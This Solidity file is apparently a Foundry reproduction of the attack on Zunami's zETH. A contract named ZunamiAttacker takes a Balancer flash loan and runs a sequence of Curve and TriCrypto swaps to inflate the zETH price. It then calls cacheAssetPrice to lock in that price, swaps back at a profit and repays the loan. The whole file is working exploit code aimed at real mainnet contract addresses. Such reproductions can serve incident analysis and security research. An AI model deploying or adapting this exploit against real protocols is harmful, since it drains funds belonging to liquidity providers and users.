// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { console2 } from "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IZETH {
    function cacheAssetPrice() external;
    function assetPrice() external view returns (uint256);
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface ITriCrypto {
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface ISushiRouter {
    function swap() external;
}

contract ZunamiAttacker is IFlashLoanRecipient {
    IBalancerVault public immutable balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IWETH9 public immutable weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public immutable zeth = IERC20(0xe47f1CD2A37c6FE69e3501AE45ECA263c5A87b2b);
    IERC20 public immutable frxETH = IERC20(0x5E8422345238F34275888049021821E8E08CAa1f);
    IERC20 public immutable crv = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);

    ISushiRouter public immutable sushiSwapRouter = ISushiRouter(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    ICurvePool public immutable zethFrxEthPool = ICurvePool(0xfC89b519658967fCBE1f525f1b8f4bf62d9b9018);
    ICurvePool public immutable ethFrxEthPool = ICurvePool(0xa1F8A6807c402E4A15ef4EBa36528A3FED24E577);
    ITriCrypto public immutable crvTricrypto = ITriCrypto(0x4eBdF703948ddCEA3B11f675B4D1Fba9d2414A14);


    constructor () {
        weth.approve(address(sushiSwapRouter), type(uint256).max);
        weth.approve(address(zethFrxEthPool), type(uint256).max);
        zeth.approve(address(zethFrxEthPool), type(uint256).max);
        weth.approve(address(ethFrxEthPool), type(uint256).max);
        frxETH.approve(address(ethFrxEthPool), type(uint256).max);
        frxETH.approve(address(zethFrxEthPool), type(uint256).max);
        weth.approve(address(crvTricrypto), type(uint256).max);
        crv.approve(address(crvTricrypto), type(uint256).max);
    }

    function attack() public {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(weth));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 6811 ether;

        bytes memory userData = hex"000000000000000000000000e47f1cd2a37c6fe69e3501ae45eca263c5a87b2b00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004d341ea7900000000000000000000000000000000000000000000000000000000";

        balancerVault.flashLoan(
            IFlashLoanRecipient(address(this)), 
            tokens, 
            amounts,
            userData
        );
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) public {
        require(msg.sender == address(balancerVault), "Not balancer");

        console2.log("ZETH price", IZETH(address(zeth)).assetPrice());
        
        weth.withdraw(300 ether);

        ethFrxEthPool.exchange{ value: 300 ether }(0, 1, 300 ether, 0);
        zethFrxEthPool.exchange(1, 0, 300 ether, 0);

        crvTricrypto.exchange(1, 2, 11 ether, 0);

        crv.transfer(0xC6A13D923FB29AF45f116889956763538D73cC51, crv.balanceOf(address(this)));

        uint8 i = 0;
        while (i < 16) {
            crvTricrypto.exchange(1, 2, 406.25 ether - 10, 0);
            unchecked {
                ++i;
            }
        }

        IZETH(address(zeth)).cacheAssetPrice();
        console2.log("ZETH price", IZETH(address(zeth)).assetPrice());

        zethFrxEthPool.exchange(0, 1, 221 ether, 0);

        crvTricrypto.exchange(2, 1, 105629 ether, 0);
        crvTricrypto.exchange(2, 1, 116060 ether, 0);
        crvTricrypto.exchange(2, 1, 128120 ether, 0);
        crvTricrypto.exchange(2, 1, 142165 ether, 0);
        crvTricrypto.exchange(2, 1, 158657 ether, 0);
        crvTricrypto.exchange(2, 1, 178201 ether, 0);
        crvTricrypto.exchange(2, 1, 201599 ether, 0);
        crvTricrypto.exchange(2, 1, 229937 ether, 0);
        crvTricrypto.exchange(2, 1, 264711 ether, 0);
        crvTricrypto.exchange(2, 1, 308034 ether, 0);
        crvTricrypto.exchange(2, 1, 362960 ether, 0);
        crvTricrypto.exchange(2, 1, 434043 ether, 0);
        crvTricrypto.exchange(2, 1, 528318 ether, 0);
        crvTricrypto.exchange(2, 1, 657120 ether, 0);
        crvTricrypto.exchange(2, 1, 839699 ether, 0);
        crvTricrypto.exchange(2, 1, 1111167 ether, 0);

        ethFrxEthPool.exchange(1, 0, frxETH.balanceOf(address(this)), 0);

        weth.deposit{ value: address(this).balance }();
        weth.transfer(address(balancerVault), 6811 ether);

        console2.log("WETH Balance:", weth.balanceOf(address(this)));
    }
    
    receive() external payable {}
}
